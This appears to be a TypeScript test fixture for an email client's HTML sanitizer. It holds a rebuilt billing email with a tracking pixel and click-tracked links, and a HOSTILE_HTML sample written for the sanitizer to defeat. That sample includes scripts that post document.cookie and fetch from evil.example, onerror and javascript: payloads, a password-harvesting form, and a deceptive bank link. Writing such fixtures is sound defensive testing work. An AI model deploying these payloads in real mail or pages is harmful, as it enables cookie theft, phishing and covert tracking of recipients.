/**
 * THE ACCEPTANCE FIXTURE — a reported billing notice, as HTML.
 *
 * A user pasted what ohmail showed them for a billing notice from their AI provider. The
 * fixture keeps that notice's shape with a fictional sender (Wolkenmail, on reserved
 * `.example` hosts), and its paste reproduces the defect line for line:
 *
 *     [the sender's logo chip, an image link]
 *     Your organization has reached its usage credits spend limit for the month.
 *     Manage usage credits
 *     [url8792.mail.wolkenmail.example/ls/click?upn=u001.Vq7pZr2LkTw3n…]
 *     Wolkenmail, … Sample Street, …
 *     Help [url8792.mail.wolkenmail.example/ls/click?upn=…] · Privacy [url8792.mail.wolkenmail.example/ls/click?upn=…]
 *     [cdn.wolkenmail.example/images/email/social_x.png]https…
 *     [cdn.wolkenmail.example/images/email/social_linkedin.pn…
 *     …
 *     [url8792.mail.wolkenmail.example/wf/open?upn=u001.Hx4mQs9dWbPz5e…]
 *
 * Every bracket in that paste is `htmlToText` inlining an `src` or an `href` it had nowhere
 * else to put — which is the proof that what reached the renderer was the `text/plain`
 * ALTERNATIVE of a `multipart/alternative`, not the mail. **The last line is a tracking
 * pixel**, printed as prose.
 *
 * {@link OWNER_BILLING_HTML} is the `text/html` part that produced it, rebuilt to the shape
 * every bulk sender uses (600 px table, a `<style>` block with a media query, a padded CTA
 * anchor, remote images on a CDN, click-tracked links through an ESP redirector, and the
 * beacon as the last element of `<body>`). {@link OWNER_BILLING_TEXT} is the text part the
 * product shipped instead.
 *
 * ── WHAT MAKES IT THE ACCEPTANCE CASE, RATHER THAN A NICE EXAMPLE ─────────────────────────
 *
 *  · `wf/open?upn=…` is a 1×1 beacon on the ESP's own host. If a test can watch a browser
 *    open this message and NOT request it, the central promise is demonstrated on the shape
 *    of the message that was reported, not on one written for the test.
 *  · `ls/click?upn=…` is a click tracker: the visible text is "Manage usage credits" and the
 *    destination is neither the sender's site nor anything a reader could guess. It is the
 *    case the "where does this actually go" affordance exists for.
 *  · The logo, the two social icons and the CTA's background are four separate remote-asset
 *    shapes (`<img src>`, `<img>` inside `<a>`, `srcset`, CSS `background-image`), so a
 *    blocker that only handles `<img src>` is visibly incomplete against it.
 *
 * The sender, its postal address, every host and every `upn` value are invented; nothing here
 * is a credential, and the `upn` payloads are cut short the way the pasted ones were.
 */

/** The `text/html` part. Sender-authored, hostile by default like every mail. */
export const OWNER_BILLING_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<style type="text/css">
  body { margin:0; padding:0; background:#f5f4ef; -webkit-font-smoothing:antialiased; }
  .wrap { width:100%; background:#f5f4ef; }
  .card { width:600px; max-width:600px; background:#ffffff; border-radius:12px; }
  .h1 { font:400 20px/1.45 ui-sans-serif,-apple-system,"Segoe UI",Helvetica,Arial,sans-serif; color:#191919; margin:0; }
  .cta { display:inline-block; background:#d97757; color:#ffffff !important; text-decoration:none;
         font:500 15px/1 ui-sans-serif,-apple-system,"Segoe UI",Helvetica,Arial,sans-serif;
         padding:13px 22px; border-radius:8px; }
  .fine { font:400 12px/1.7 ui-sans-serif,-apple-system,"Segoe UI",Helvetica,Arial,sans-serif; color:#6b6b6b; }
  .fine a { color:#6b6b6b; }
  .hero { background-image:url("https://cdn.wolkenmail.example/images/email/usage_hero.png"); background-size:cover; height:120px; }
  @media only screen and (max-width:620px) {
    .card { width:100% !important; border-radius:0 !important; }
    .pad { padding-left:22px !important; padding-right:22px !important; }
  }
</style>
</head>
<body>
<table role="presentation" class="wrap" cellpadding="0" cellspacing="0" border="0" width="100%">
  <tr><td align="center" style="padding:32px 12px;">
    <table role="presentation" class="card" cellpadding="0" cellspacing="0" border="0">
      <tr><td class="pad" style="padding:32px 40px 0;">
        <img src="https://cdn.wolkenmail.example/images/email/wolkenmail_logo_chip.png"
             srcset="https://cdn.wolkenmail.example/images/email/wolkenmail_logo_chip@2x.png 2x"
             width="104" height="22" alt="Wolkenmail" style="display:block;border:0;">
      </td></tr>
      <tr><td class="pad hero" style="padding:0;"></td></tr>
      <tr><td class="pad" style="padding:30px 40px 0;">
        <p class="h1">Your organization has reached its usage credits spend limit for the month.</p>
      </td></tr>
      <tr><td class="pad" style="padding:26px 40px 0;">
        <a class="cta" href="https://url8792.mail.wolkenmail.example/ls/click?upn=u001.Vq7pZr2LkTw3nmQx9wZ0Zg2K5X7pQ">Manage usage credits</a>
      </td></tr>
      <tr><td class="pad fine" style="padding:38px 40px 0;">
        Wolkenmail, 12 Sample Street, 8000 Exampleton<br>
        <a href="https://url8792.mail.wolkenmail.example/ls/click?upn=u001.help.7bQ2xTn0">Help</a>
        &middot;
        <a href="https://url8792.mail.wolkenmail.example/ls/click?upn=u001.privacy.9dLm4RtP">Privacy</a>
      </td></tr>
      <tr><td class="pad" style="padding:22px 40px 40px;">
        <a href="https://social.example/wolkenmail"><img src="https://cdn.wolkenmail.example/images/email/social_x.png" width="20" height="20" alt="X" style="border:0;"></a>
        <a href="https://network.example/company/wolkenmail"><img src="https://cdn.wolkenmail.example/images/email/social_linkedin.png" width="20" height="20" alt="LinkedIn" style="border:0;"></a>
      </td></tr>
    </table>
  </td></tr>
</table>
<img src="https://url8792.mail.wolkenmail.example/wf/open?upn=u001.Hx4mQs9dWbPz5eRk9mNqTt2wVx" width="1" height="1" border="0" alt="" style="height:1px !important;width:1px !important;border-width:0 !important;margin:0 !important;padding:0 !important;">
</body>
</html>`;

/**
 * The `text/plain` alternative — mailparser's `htmlToText` of the above, which is what the
 * product rendered before this change and what was pasted. Kept so the fallback path is
 * tested against real converter output rather than against prose somebody typed.
 */
export const OWNER_BILLING_TEXT = `Wolkenmail [cdn.wolkenmail.example/images/email/wolkenmail_logo_chip.png]

Your organization has reached its usage credits spend limit for the month.

Manage usage credits [https://url8792.mail.wolkenmail.example/ls/click?upn=u001.Vq7pZr2LkTw3nmQx9wZ0Zg2K5X7pQ]

Wolkenmail, 12 Sample Street, 8000 Exampleton
Help [https://url8792.mail.wolkenmail.example/ls/click?upn=u001.help.7bQ2xTn0] · Privacy [https://url8792.mail.wolkenmail.example/ls/click?upn=u001.privacy.9dLm4RtP]

[cdn.wolkenmail.example/images/email/social_x.png]https://social.example/wolkenmail
[cdn.wolkenmail.example/images/email/social_linkedin.png]https://network.example/company/wolkenmail

[https://url8792.mail.wolkenmail.example/wf/open?upn=u001.Hx4mQs9dWbPz5eRk9mNqTt2wVx]`;

/** The beacon in the reported mail. Named, so a test can assert on THIS url and no other. */
export const OWNER_TRACKING_PIXEL =
  "https://url8792.mail.wolkenmail.example/wf/open?upn=u001.Hx4mQs9dWbPz5eRk9mNqTt2wVx";

/** Every remote host the fixture references. Nothing in this list may be contacted on open. */
export const OWNER_REMOTE_HOSTS = ["cdn.wolkenmail.example", "url8792.mail.wolkenmail.example"] as const;

/**
 * A SECOND fixture, and it is not the reported mail: everything a sender can put in an html
 * part that must not survive. Kept apart from {@link OWNER_BILLING_HTML} on purpose — mixing
 * the attack vectors into the acceptance case would mean neither file can be read as "this is
 * what a real message looks like" or as "this is what we refuse".
 *
 * Each line is one vector, and each one is asserted individually:
 *   1  <script>, in <head> AND in <body>  — execution. BOTH, because the sanitizer is handed
 *                                        `body.innerHTML`: a head-only script never reaches
 *                                        it, so a fixture with only that one made the
 *                                        "no script survives" assertion pass even with the
 *                                        sanitizer removed altogether. Found by mutation.
 *   2  onerror= / onload=                — execution without a <script>
 *   3  javascript: href                  — execution on click
 *   4  <iframe>, <object>, <embed>       — a nested browsing context of the sender's choosing
 *   5  <form>                            — a credential prompt inside the mail
 *   6  <base href>                        — silently re-targets every relative url
 *   7  <meta http-equiv=refresh>          — navigation with no click at all
 *   8  <link rel=stylesheet href=remote>  — a remote fetch that is not an image
 *   9  @import + url() in <style>         — the same, from inside CSS
 *  10  a <style> aimed at the APP's own chrome, not the mail's
 *  11  <img srcset>, <body background>, <video poster>, <svg><image href>
 *      — remote fetches that a blocker watching only `<img src>` would miss
 */
export const HOSTILE_HTML = `<!DOCTYPE html>
<html>
<head>
<base href="https://evil.example/">
<meta http-equiv="refresh" content="0;url=https://evil.example/gone">
<link rel="stylesheet" href="https://evil.example/mail.css">
<style>
  @import url("https://evil.example/imported.css");
  :root { --accent: #ff0000; --canvas: #ff0000; }
  body, html { background: #ff0000 !important; }
  .msg-body, .msg-p, .rail, .stream, .pane { display: none !important; }
  .leak { background-image: url("https://evil.example/css-beacon.gif"); }
</style>
<script>window.parent.postMessage(document.cookie, "*")</script>
</head>
<body background="https://evil.example/body-bg.png">
  <p class="leak">Hello.</p>
  <script>fetch("https://evil.example/body-script")</script>
  <img src="x" onerror="fetch('https://evil.example/onerror')">
  <img src="https://evil.example/a.png" srcset="https://evil.example/a@2x.png 2x" onload="fetch('https://evil.example/onload')">
  <a href="javascript:fetch('https://evil.example/js-href')">Click me</a>
  <a href="https://evil.example/login" >https://www.bank.example/secure</a>
  <form action="https://evil.example/harvest" method="post">
    <input name="password" type="password"><button type="submit">Verify your account</button>
  </form>
  <iframe src="https://evil.example/frame"></iframe>
  <object data="https://evil.example/o.swf"></object>
  <embed src="https://evil.example/e.swf">
  <video poster="https://evil.example/poster.jpg"></video>
  <svg><image href="https://evil.example/svg.png" /></svg>
</body>
</html>`;

/** Every host `HOSTILE_HTML` tries to reach. A live open must produce zero requests to it. */
export const HOSTILE_HOST = "evil.example";
